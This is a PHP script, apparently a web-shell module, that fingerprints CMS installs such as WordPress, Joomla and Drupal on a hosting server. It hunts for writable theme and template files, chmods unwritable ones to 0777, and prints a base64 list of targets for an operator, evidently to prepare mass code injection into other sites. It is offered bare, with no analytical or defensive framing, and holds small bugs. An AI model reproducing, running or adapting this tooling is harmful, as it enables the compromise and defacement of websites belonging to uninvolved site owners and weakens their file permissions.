$debug_mode = false;
@set_time_limit(0);
@error_reporting(7);
@ini_set('display_errors', 'On');
@ini_set('log_errors', 'Off');
@set_magic_quotes_runtime(0);
@ini_set("magic_quotes_runtime", 0);
if (get_magic_quotes_gpc()) {
    function stripslashes_deep($value)
    {
        $value = is_array($value) ?
            array_map('stripslashes_deep', $value) :
            stripslashes($value);
        return $value;
    }

    $_POST = array_map('stripslashes_deep', $_POST);
    $_GET = array_map('stripslashes_deep', $_GET);
    $_COOKIE = array_map('stripslashes_deep', $_COOKIE);
    $_REQUEST = array_map('stripslashes_deep', $_REQUEST);
}
if (strpos(strtolower(PHP_OS), 'win') !== FALSE) {
    if ($debug_mode) echo "debug: windows found: " . PHP_OS . "\n";
    $shindoshs = true;
} else {
    $shindoshs = false;
//    function getSystemMemInfo()
//    {
//        $data = explode("\n", file_get_contents("/proc/meminfo"));
//        $meminfo = array();
//        foreach ($data as $line) {
//            list($key, $val) = explode(":", $line);
//            $meminfo[$key] = trim($val);
//        }
//        return $meminfo;
//    }
}
if ($debug_mode) echo "debug: php version: " . phpversion() . " || date: " . date("Y-m-d H:i:s", time()) . "\n";
if ($debug_mode) echo "debug: memory peak usage " . (memory_get_peak_usage(true) / 1024) . " kB\n";
if ($debug_mode && $shindoshs == false) echo "debug: server cpu usage " . get_server_cpu_usage() . "% \n";
if ($debug_mode && $shindoshs == false) {
    #$mem = getSystemMemInfo();
    #echo "debug: free memory " . $mem["MemFree"] . "\n";
    #echo "debug: total memory " . $mem["MemTotal"] . "\n";
}

if (!function_exists('fnmatch')) {
    function fnmatch($pattern, $string)
    {
        return preg_match("#^" . strtr(preg_quote($pattern, '#'), array('\*' => '.*', '\?' => '.')) . "$#i", $string);
    }
}

// Wordpress
$cms_database['wordpress']['name'] = "WordPress";
$cms_database['wordpress']['id'] = "10";
$cms_database['wordpress']['file_regexp'] = "/wp-content\/themes\/(.*)\/header\.php/";
$cms_database['wordpress']['core_files'] = "wp-content,wp-admin,wp-includes";
$cms_database['wordpress']['scan_dir'] = "wp-content";
//Joomla
$cms_database['joomla']['name'] = "Joomla";
$cms_database['joomla']['id'] = "11";
$cms_database['joomla']['file_regexp'] = "/templates\/(.*)\/index\.php/";
//$cms_database['joomla']['file_regexp'] = "/templates\/(.*)\/header\.php/";
//$cms_database['joomla']['core_files'] = "administrator,cache,components,images,includes,language,libraries,logs,media,modules,plugins,templates,tmp";
$cms_database['joomla']['core_files'] = "administrator,cache,components,images,includes,language,libraries,logs,media,modules,plugins,templates";
$cms_database['joomla']['scan_dir'] = "templates";
// Drupal
$cms_database['drupal']['name'] = "Drupal";
$cms_database['drupal']['id'] = "13";
$cms_database['drupal']['file_regexp'] = "/((themes\/(.*)page\.tpl\.php)|(themes\/(.*)\.(php|tpl)))/Uis";
$cms_database['drupal']['core_files'] = "includes,misc,modules,profiles,scripts,sites,themes";
$cms_database['drupal']['scan_dir'] = "themes";
// typo3
$cms_database['typo3']['name'] = "TYPO3";
$cms_database['typo3']['id'] = "24";
$cms_database['typo3']['file_regexp'] = "/(.*(header|footer|index|main).*\.(php|html))/";
$cms_database['typo3']['core_files'] = "fileadmin,typo3conf,typo3temp,uploads";
$cms_database['typo3']['scan_dir'] = "/";
//phpBB
$cms_database['phpBB3']['name'] = "phpBB";
$cms_database['phpBB3']['id'] = "15";
$cms_database['phpBB3']['file_regexp'] = "/styles\/.*\/template\/(.*)\.html/Uis";
$cms_database['phpBB3']['core_files'] = "adm,cache,docs,download,files,images,includes,install,language,store,styles";
$cms_database['phpBB3']['scan_dir'] = "styles";
//PunBB
$cms_database['PunBB']['name'] = "PunBB";
$cms_database['PunBB']['id'] = "18";
$cms_database['PunBB']['file_regexp'] = "/include\/template\/(.*)\.(htm|html|tpl|php|js)/";
$cms_database['PunBB']['core_files'] = "admin,cache,extensions,img,include,lang,style";
$cms_database['PunBB']['scan_dir'] = "include/template";
// e107
$cms_database['e107']['name'] = "e107";
$cms_database['e107']['id'] = "16";
$cms_database['e107']['file_regexp'] = "/((.*)\.(js|php))/Uis";
$cms_database['e107']['core_files'] = "e107_admin,e107_images,e107_languages,e107_plugins,e107_themes";
$cms_database['e107']['scan_dir'] = "e107_themes";
//DLE
$cms_database['dle']['name'] = "DataLife Engine";
$cms_database['dle']['id'] = "12";
$cms_database['dle']['file_regexp'] = "/(templates\/(.*)\/main\.tpl)|(.*\.js)/";
$cms_database['dle']['core_files'] = "backup,engine,language,templates,upgrade,uploads";
$cms_database['dle']['scan_dir'] = "templates";
// SMF
//$cms_database['smf']['name']         =  "Simple Machines Forum (SMF)";
$cms_database['smf']['name'] = "SMF";
$cms_database['smf']['id'] = "19";
$cms_database['smf']['file_regexp'] = "/(Themes\/(.*)\/index\.template\.(htm|html|tpl|php))|(.*)\.js/";
$cms_database['smf']['core_files'] = "attachments,avatars,cache,Packages,Smileys,Sources,Themes";
$cms_database['smf']['scan_dir'] = "Themes";


$current_domain = $_SERVER['SERVER_NAME'];
$path_parts = pathinfo($_SERVER['PHP_SELF']);
$paths = $path_parts['dirname'];
$shell_filename = getcwd() . DIRECTORY_SEPARATOR . $path_parts['basename'];
$UnicCheck[1] = 'Unic';
if ($UnicCheck[1] == "Unic") $dir_lvl = 1; else $dir_lvl = 0;
for ($i = $dir_lvl; $i <= substr_count($paths, DIRECTORY_SEPARATOR); $i++) {
    chdir('../');
}
if ($shindoshs) chdir('../');
$homedir = getcwd();
#$homedir = '/var/www'; #mimic neighbors scheme
#$homedir = '/var/www/obmediaservice.alltransportme.com'; #mimic current domain scheme
$GLOBALS["foundarray"] = array();
$GLOBALS["srvc_j"] = 0;
$GLOBALS["rezultarray"] = array();
$GLOBALS["rezultarray[0]"] = "";
if ($debug_mode) echo "debug: searching homedir: " . $homedir . " ----------------------------------\n";
$GLOBALS["foundarray"] = null;
unset($GLOBALS["foundarray"]);
//var_dump(get_children_path_list($homedir));
//var_dump(get_children_dir_list($homedir));

#$root_dir = true;
$GLOBALS["root_dir"] = true;
#$cms_found = false;
$GLOBALS["cms_found"] = false;
#$cms_done = false;
$GLOBALS["cms_done"] = false;
$GLOBALS["first_run"] = true;
search_cms_recursively($homedir, 0, 10, $debug_mode, $shell_filename, $GLOBALS["srvc_j"], $GLOBALS["foundarray"], $GLOBALS["cms_done"], $GLOBALS["cms_found"], $GLOBALS["root_dir"], $cms_database);
srvc_cool_search_file($homedir, 0, 10, $debug_mode, $shell_filename, $GLOBALS["srvc_j"], $GLOBALS["foundarray"], $cms_database, $shindoshs);
//srvc_cool_search_file_cms($homedir, 0, 10, true, $shell_filename, $GLOBALS["srvc_j"], $GLOBALS["foundarray"]);


if ($debug_mode) echo "debug: total found: " . count($GLOBALS["foundarray"]) . "\n";

if (count($GLOBALS["foundarray"]) != "0") {
    $GLOBALS["rezultarray[1]"] = base64_encode(implode("\n", $GLOBALS["foundarray"]));
    if ($debug_mode) echo "debug: base64 length: " . strlen($GLOBALS["rezultarray[1]"]) . "\n";
} else {
    if ($debug_mode) echo "debug: nothing found\n";
}
if ($debug_mode) echo "debug: memory peak usage " . (memory_get_peak_usage(true) / 1024) . " kB\n";
if ($debug_mode && $shindoshs == false) echo "debug: server cpu usage " . get_server_cpu_usage() . "% \n";
if ($debug_mode && $shindoshs == false) {
//    $mem = getSystemMemInfo();
//    echo "debug: free memory " . $mem["MemFree"] . "\n";
//    echo "debug: total memory " . $mem["MemTotal"] . "\n";
}


echo "rezult123123" . $GLOBALS["rezultarray[0]"] . "\n\n" . $GLOBALS["rezultarray[1]"];


function search_cms_recursively($homedir, $level, $max_level = 10, $debug_mode, $shell_filename, $srvc_j, $foundarray, $cms_done, $cms_found, $root_dir, $cms_database)
{
    global $foundarray, $srvc_j;
#$root_dir = true;
#$cms_found = false;
    if($GLOBALS["first_run"]){
        srvc_cool_search_file_cms($homedir, $level, $max_level, $debug_mode, $shell_filename, $srvc_j, $foundarray, $cms_done, $cms_found, $root_dir, $cms_database);
        $GLOBALS["first_run"] = false;
    }
    //global $cms_done, $cms_found, $root_dir;
    //$root_dir = true;
    //$cms_found = false;
    //$cms_done = false;
    if ($cms_found == false) {
        if ($handle = opendir($homedir)) {
            while (false !== ($file = readdir($handle))) {
                if ($file == "." or $file == "..") {
                    continue;
                }
                if (filetype($homedir . DIRECTORY_SEPARATOR . $file) == "dir") {
                    $subpaths[] = $homedir . DIRECTORY_SEPARATOR . $file;
                }
            }

            if (is_array($subpaths)) {
                foreach ($subpaths as $subpath) {
#$root_dir = true;
                    $GLOBALS["root_dir"] = true;
#$cms_found = false;
                    $GLOBALS["cms_found"] = false;
#$cms_done = false;
                    $GLOBALS["cms_done"] = false;
                    srvc_cool_search_file_cms($subpath, $level, $max_level, $debug_mode, $shell_filename, $srvc_j, $foundarray, $cms_done, $cms_found, $root_dir, $cms_database);

                    search_cms_recursively($subpath, $level, $max_level, $debug_mode, $shell_filename, $srvc_j, $foundarray, $cms_done, $cms_found, $root_dir, $cms_database);
                }
            }
        }
    }
}


//function search_files_recursively($homedir, $level, $max_level = 10, $debug_mode, $shell_filename, $srvc_j, $foundarray)
//{
//    global $cms_done, $cms_found, $root_dir;
//    if ($cms_found == false) {
//        if (is_array(get_children_path_list($homedir))) {
//            foreach (get_children_path_list($homedir) as $subpath) {
//
//                srvc_cool_search_file($subpath, 0, 10, true, $shell_filename, $GLOBALS["srvc_j"], $GLOBALS["foundarray"]);
//                search_files_recursively($subpath, 0, 10, true, $shell_filename, $GLOBALS["srvc_j"], $GLOBALS["foundarray"]);
//            }
//        }
//    }
//}


function srvc_cool_search_file_cms($DIR, $level, $max_level = 10, $debug_mode, $script_filename, $srvc_j, $foundarray, $cms_done, $cms_found, $root_dir, $cms_database)
{
    //global $foundarray, $srvc_j, $debug_mode;
    global $foundarray, $srvc_j;
    $mask = array('php', 'php5', 'php4', 'php3', 'html', 'htm', 'phtml', 'shtml', 'tpl');

    $level++;
    if ($level >= $max_level) {
        if ($debug_mode) echo "debug: max depth reached for dir " . $DIR . "!\n";
        return false;
    }
    if ($shindoshs) {
        if ($debug_mode) echo "debug: replacing slashes in:" . $DIR . "\n";
        $DIR = preg_replace("#/$#", "", str_replace("\\", "/", $DIR));
    }
    if ($handle = opendir($DIR)) {
        while (false !== ($file = readdir($handle))) {
            if ($file == "." or $file == "..") {
                continue;
            }
###cms det###

            if ($cms_done == false) {
                $cms_done = true;
                $handle_root = opendir($DIR);
                while (false !== ($file_root = readdir($handle_root))) {
                    if ($file_root == "." or $file_root == "..") {
                        continue;
                    }
                    $root_dirs[] = $file_root;
                }
                if (is_array($root_dirs)) {
                    foreach ($cms_database as $cms) {
                        foreach (explode(',', $cms['core_files']) as $v) {
                            if (!in_array($v, $root_dirs)) continue 2;
                        }
                        if ($debug_mode) echo "debug: cms found: " . $cms['name'] . "\n";
                        echo "debug: cms found: " . $cms['name'] . " at line " . __line__ . "\n";
                        $cms_found = $cms['name'];
                    }
                    if (!isset($cms_found)) $cms_found = false;
                }
                unset($root_dirs);
            }
###scan###
            if ($cms_found !== false) {
                $opendir = ($root_dir) ? $DIR . '/' . $cms_database[strtolower($cms_found)]['scan_dir'] : $DIR;
                $root_dir = false;
                #echo "debug: \$opendir: " . $opendir . " at line " . __line__ . "\n";
                $handle_scan = opendir($opendir);

                while (false !== ($file_scan = readdir($handle_scan))) {
                    if ($file_scan == "." or $file_scan == "..") {
                        continue;
                    }
                    if (filetype($opendir . "/" . $file_scan) == "file") {
                        #echo "debug: found path: " . $opendir . "/" . $file_scan . " at line " . __line__ . "\n";
                        $filetype = strtolower(end(explode(".", $file_scan)));
                        if (in_array($filetype, (array)$mask)) {
                            $fsz = filesize($opendir . "/" . $file_scan);
                            if ($fsz > 200 && $fsz <= 1048576) {
                                if (is_writable($opendir . "/" . $file_scan)) {
                                    if (preg_match($cms_database[strtolower($cms_found)]['file_regexp'], $opendir . "/" . $file_scan)) {
                                        #echo "debug: found path: " . $opendir . "/" . $file_scan . " at line " . __line__ . "\n";
                                        if ($opendir . "/" . $file_scan != $script_filename) {
                                            $foundarray[$srvc_j] = $opendir . "/" . $file_scan;
                                            #echo "debug: found path: " . $foundarray[$srvc_j] . " at line " . __line__ . "\n";
                                            if ($debug_mode) echo "debug: found file: " . $foundarray[$srvc_j] . "\n";
                                            $srvc_j++;
                                            if ($debug_mode) echo "debug: srvc_j =  " . $srvc_j . "\n";
                                        } else {
                                            if ($debug_mode) echo "debug: found our own script: " . $script_filename . "\n";
                                        }
                                    }
                                } elseif (preg_match($cms_database[strtolower($cms_found)]['file_regexp'], $opendir . "/" . $file_scan)) {
                                    $chmod = substr(sprintf("%o", fileperms($opendir . "/" . $file_scan)), -3);
#        if($debug_mode) echo "debug: file is not writable: ".$DIR."/".$file." chmod ".$chmod."; trying to chmod\n";
                                    @chmod($opendir . "/" . $file_scan, 0777);
                                    if (is_writable($opendir . "/" . $file_scan)) {
                                        if ($opendir . "/" . $file_scan != $script_filename) {
                                            $foundarray[$srvc_j] = $opendir . "/" . $file_scan . " " . $chmod;
#         if($debug_mode) echo "debug: chmod succeeded!\n";
                                            if ($debug_mode) echo "debug: found file: " . $foundarray[$srvc_j] . "\n";
                                            $srvc_j_++;
                                            if ($debug_mode) echo "debug: srvc_j =  " . $srvc_j . "\n";
                                        } else {
                                            if ($debug_mode) echo "debug: found our own script: " . $script_filename . "\n";
                                        }
                                    } else {
#       if($debug_mode) echo "debug: chmod failed!\n";
                                    }
                                }
                            } else {
#  if($debug_mode) echo "debug: big or small file: ".$DIR."/".$file." ".$fsz."\n";
                            }
                        }
                    } else {
                        if (filetype($opendir . "/" . $file_scan) == "dir") {
                            $llllolo = $opendir . "/" . $file_scan;
                            $llllolo = preg_replace("/\/\//", "/", $llllolo);
                            $DIR = preg_replace("/\/\//", "/", $opendir);
                            $lastpart = preg_replace("/.*\//", "", $llllolo);
//if (!in_array($DIR, (array)$exclude_sys_dir) && !in_array($llllolo, (array)$exclude_sys_dir)) {
//if (!in_array($lastpart, (array)$exclude_web_dir)) {
#  if($debug_mode) echo "debug: descending into folder: ".$llllolo."\n";
                            srvc_cool_search_file_cms($llllolo, $level, $max_level, $debug_mode, $script_filename, $GLOBALS["srvc_j"], $GLOBALS["foundarray"], $cms_done, $cms_found, $root_dir, $cms_database);
//} else {
# if($debug_mode) echo "debug: dir ".$llllolo." (last part: $lastpart) is in exclude list!\n";
//}
//}
                        }
                    }
                }
            }
            break;
        }
    }
}

function is_file_excluded($path, $masks = array())
{
#if (filetype($path) == "file") {
    foreach ($masks as $mask) {
        if (fnmatch($mask, $path)) return TRUE;
    }
#}
    return FALSE;
}

function is_dir_excluded($path, $masks = array())
{
#if (filetype($path) == "dir") {
    foreach ($masks as $mask) {
        if (fnmatch($mask, $path)) return TRUE;
    }
#}
    return FALSE;
}

function get_server_cpu_usage()
{

    $load = sys_getloadavg();
    return $load[0];

}

function srvc_cool_search_file($DIR, $level, $max_level = 10, $debug_mode, $script_filename, $srvc_j, $foundarray, $cms_database, $shindoshs)
{
    global $foundarray, $srvc_j;
    $mask = array('php', 'php5', 'php4', 'php3', 'html', 'htm', 'phtml', 'shtml', 'tpl');
    $exclude_sys_dir = array('/bin', '/boot', '/dev', '/etc', '/lib', '/lib64', '/libexec', '/lost+found', '/proc', '/root', '/run', '/sbin', '/selinux', '/sys', '/usr/bin', '/usr/lib', '/usr/lib64', '/usr/sbin', '/usr/src', '/usr/share/doc', '/usr/include', '/usr/lib', '/usr/lib64');
//$exclude_web_dir = array('cgi-bin', 'cgi-lib', 'cgi-global', 'awstats', 'webstat', 'webstat.awstats', 'webstat.none', 'webstat.old', 'stats', 'stat', 'old_stats', 'error_log', 'tmp', 'mod-tmp', 'temp', 'logs', 'log', 'backup', 'cache', 'manual', 'man', 'usage', 'lost+found');
    $exclude_web_dir = array('*/cgi-bin', '*/cgi-bin/*', '*/cgi-lib', '*/cgi-lib/*', '*/cgi-global', '*/cgi-global/*', '*/awstats', '*/awstats/*', '*/webstat', '*/webstat/*', '*/webstat.awstats', '*/webstat.awstats/*', '*/webstat.none', '*/webstat.none/*', '*/webstat.old', '*/webstat.old/*', '*/stats', '*/stats/*', '*/stat', '*/stat/*', '*/old_stats', '*/old_stats/*', '*/error_log', '*/error_log/*', '*/tmp', '*/tmp/*', '*/mod-tmp', '*/mod-tmp/*', '*/temp', '*/temp/*', '*/logs', '*/logs/*', '*/log', '*/log/*', '*/backup', '*/backup/*', '*/cache', '*/cache/*', '*/manual', '*/manual/*', '*/man', '*/man/*', '*/usage', '*/usage/*', '*/lost+found', '*/lost+found/*');
    //$exclude_file_masks = array('*/wp-login.php', '*/wp-admin.php');
    //$exclude_dir_masks = array('*/img/*', '*/img', '*/backup*/*', '*/backup*', '*/plugins/*', '*/plugins', '*/tinymce/*', '*/tinymce', '*/wp-includes/js/*', '*/ssp/app/webroot/js*/*', '*/includes/js/*', '/help/*', 'system/js/', '*/wp-includes/js', '*/functions/js', '*/uploads/*', '*/uploads', '*/themes/*/js/*', '*/themes/*/js', '*/fckeditor/*', '*/fckeditor', '*/ckeditor/*', '*/ckeditor', '*/FCKeditor/*', '*/FCKeditor', '*/wp-admin/*', '*/wp-admin', '*/tiny_mce/*', '*/tiny_mce', '*/system/js/*', '*/system/js', '*/editors/*', '*/editors', '*/wp-content/themes/*/lib/*', '*/wp-content/themes/*/lib/', '*/wp-content/themes/*/*.js', '*/webalizer/*', '*/webalizer', '*/phpMailer/*', '*/phpMailer');
    $exclude_file_masks = array('*/readme.html','*/admin.php','*/admin.htm','*/admin.html','*/wp-login.php','*/wp-signup.php','*/usage_*.html','*/wp-rss2.php','*/wp-pass.php','*/wp-links-opml.php','*/wp-app.php','*/wp-feed.php','*/wp-activate.php','*/wp-mail.php','*/wp-config.php','*/wp-trackback.php','*/xmlrpc.php','*/wp-register.php','*/wp-atom.php','*/wp-commentsrss2.php','*/wp-load.php','*/wp-rdf.php','*/wp-config-sample.php','*/wp-settings.php','*/wp-rss.php','*/wp-comments-post.php','*/wp-blog-header.php','*/wp-cron.php','*/COPYRIGHT.php','*/CHANGELOG.php','*/configuration.php','*/LICENSES.php','*/LICENSE.php','*/LICENSE.html','*/CREDITS.php','*/capcha.php','*/config.php');
    $exclude_dir_masks = array('*/administrator2/*','*/administrator2','*/backup*','*/backup*/*','*/cache','*/cache/*','*/ckeditor','*/ckeditor/*','*/cli','*/cli/*','*/docs','*/docs/*','*/editors','*/editors/*','*/error','*/error/*','*/examples','*/examples/*','*/fckeditor','*/FCKeditor','*/fckeditor/*','*/FCKeditor/*','*/help/*','*/img','*/img/*','*/installation','*/installation*/*','*/jupgrade','*/jupgrade/*','*/phpMailer','*/phpMailer/*','*/phpMyAdmin','*/phpMyAdmin/*','*/plugins','*/plugins/*','*/statystyka/*','*/statystyka','*/tiny_mce','*/tiny_mce/*','*/tinymce','*/tinymce/*','*/tmp','*/tmp/*','*/uploads','*/uploads/*','*/webalizer','*/webalizer/*','*/webstats','*/webstats/*','*/xmlrpc','*/xmlrpc/*');
    $exclude_dir_masks = array_merge($exclude_dir_masks, array_merge($exclude_sys_dir, $exclude_web_dir));

    $level++;
    if ($level >= $max_level) {
        if ($debug_mode) echo "debug: max depth reached for dir " . $DIR . "!\n";
        return false;
    }
    if ($shindoshs) {
        if ($debug_mode) echo "debug: replacing slashes in:" . $DIR . "\n";
        $DIR = preg_replace("#/$#", "", str_replace("\\", "/", $DIR));
    }


    $cms_found = false;
    $handle_root = opendir($DIR);
    while (false !== ($file_root = readdir($handle_root))) {
        if ($file_root == "." or $file_root == "..") {
            continue;
        }
        $root_dirs[] = $file_root;
    }
    if (is_array($root_dirs)) {
        foreach ($cms_database as $cms) {
            foreach (explode(',', $cms['core_files']) as $v) {
                if (!in_array($v, $root_dirs)) continue 2;
            }
            if ($debug_mode) echo "debug: cms found: " . $cms['name'] . "skipping it\n";
            echo "debug: cms found: " . $cms['name'] . " at line " . __line__ . "\n";
            $cms_found = $cms['name'];
        }
    }
    unset($root_dirs);
    if (!isset($cms_found)) $cms_found = false;

    if ($handle = opendir($DIR)) {
        while ($file = readdir($handle)) {
            if ($file == "." or $file == "..") {
                continue;
            }

            $cms_folder = false;
            if ($cms_found !== false) {
                foreach (explode(',', $cms_database[strtolower($cms_found)]['core_files']) as $v) {
                    if ($v == $file) $cms_folder = true;
                }
            }


            if ($cms_folder) continue;

            if (filetype($DIR . "/" . $file) == "file") {

                $filetype = strtolower(end(explode(".", $file)));
                if (in_array($filetype, (array)$mask)) {
#if (is_file_excluded($DIR . "/" . $file,$mask)) {
                    $fsz = filesize($DIR . "/" . $file);
                    if ($fsz > 200 && $fsz <= 1048576) {
                        if (is_writable($DIR . "/" . $file)) {
                            if (is_file_excluded($DIR . "/" . $file, $exclude_file_masks) || is_file_excluded($DIR . "/" . $file, $exclude_dir_masks)) continue;
                            # specific excludes
                            if (fnmatch('*/footer.php', $DIR . "/" . $file) && file_exists(dirname($DIR . "/" . $file) . DIRECTORY_SEPARATOR . 'header.php')) continue;
                            if (file_exists(dirname($DIR . "/" . $file) . DIRECTORY_SEPARATOR . 'index.php') && ($cms_found && $cms_found=='Joomla')) continue;
#var_dump($DIR."/".$file,$script_filename);
#exit('debug');
                            if ($DIR . "/" . $file != $script_filename) {
                                $foundarray[$srvc_j] = $DIR . "/" . $file;
                                if ($debug_mode) echo "debug: found file: " . $foundarray[$srvc_j] . "\n";
                                $srvc_j++;
                                if ($debug_mode) echo "debug: srvc_j =  " . $srvc_j . "\n";
                            } else {
                                if ($debug_mode) echo "debug: found our own script: " . $script_filename . "\n";
                            }
                        } else {
                            $chmod = substr(sprintf("%o", fileperms($DIR . "/" . $file)), -3);
#        if($debug_mode) echo "debug: file is not writable: ".$DIR."/".$file." chmod ".$chmod."; trying to chmod\n";
                            @chmod($DIR . "/" . $file, 0777);
                            if (is_writable($DIR . "/" . $file)) {
#var_dump($DIR."/".$file,$script_filename);
#exit('debug');
                                if ($DIR . "/" . $file != $script_filename) {
                                    $foundarray[$srvc_j] = $DIR . "/" . $file . " " . $chmod;
#         if($debug_mode) echo "debug: chmod succeeded!\n";
                                    if ($debug_mode) echo "debug: found file: " . $foundarray[$srvc_j] . "\n";
                                    $srvc_j_++;
                                    if ($debug_mode) echo "debug: srvc_j =  " . $srvc_j . "\n";
                                } else {
                                    if ($debug_mode) echo "debug: found our own script: " . $script_filename . "\n";
                                }
                            } else {
#       if($debug_mode) echo "debug: chmod failed!\n";
                            }
                        }
                    } else {
#  if($debug_mode) echo "debug: big or small file: ".$DIR."/".$file." ".$fsz."\n";
                    }
                }
            } else {

//if (filetype($DIR . "/" . $file) == "dir" && !is_dir_excluded($DIR . "/" . $file, $exclude_dir_masks)) {
                if (filetype($DIR . "/" . $file) == "dir" && !is_dir_excluded($DIR . "/" . $file, $exclude_dir_masks)) {
                    {

                        $llllolo = $DIR . "/" . $file;
                        $llllolo = preg_replace("/\/\//", "/", $llllolo);
                        $DIR = preg_replace("/\/\//", "/", $DIR);
                        $lastpart = preg_replace("/.*\//", "", $llllolo);
                        if (!in_array($DIR, (array)$exclude_sys_dir) && !in_array($llllolo, (array)$exclude_sys_dir)) {
#if (!is_dir_excluded($DIR, (array)$exclude_sys_dir) && !is_dir_excluded($llllolo, (array)$exclude_sys_dir)) {
                            if (!in_array($lastpart, (array)$exclude_web_dir)) {
#if (!is_dir_excluded($lastpart, (array)$exclude_web_dir)) {
#  if($debug_mode) echo "debug: descending into folder: ".$llllolo."\n";
                                srvc_cool_search_file($llllolo, $level, $max_level, $debug_mode, $script_filename, $GLOBALS["srvc_j"], $GLOBALS["foundarray"], $cms_database, $shindoshs);
                            } else {
# if($debug_mode) echo "debug: dir ".$llllolo." (last part: $lastpart) is in exclude list!\n";
                            }
                        }

                    }
                }
            }
        }
#closedir($handle);
    } else {
# if($debug_mode) echo "debug: ERROR: can't open dir ".$DIR."\n";
    }
}

function is_dir_file_excluded($path, $masks = array())
{
#if (filetype($path) == "file") {
    foreach ($masks as $mask) {
        list($dir_mask, $file_mask) = explode('||', $mask);
        if (fnmatch($file_mask, $path) && fnmatch($dir_mask, $path)) return TRUE;
    }
#}
    return FALSE;

}

function get_children_path_list($DIR)
{
    if ($handle = opendir($DIR)) {
        while (false !== ($file = readdir($handle))) {
            if ($file == "." or $file == "..") {
                continue;
            }
            if (filetype($DIR . DIRECTORY_SEPARATOR . $file) == "dir") {
                $subpaths[] = $DIR . DIRECTORY_SEPARATOR . $file;
            }
        }
        if (isset($subpaths)) return $subpaths;
    }
    return false;
}

function get_children_dir_list($DIR)
{
    if ($handle = opendir($DIR)) {
        while (false !== ($file = readdir($handle))) {
            if ($file == "." or $file == "..") {
                continue;
            }
            if (filetype($DIR . DIRECTORY_SEPARATOR . $file) == "dir") {
                $subdirs[] = $file;
            }
        }
        if (isset($subdirs)) return $subdirs;
    }
    return false;
}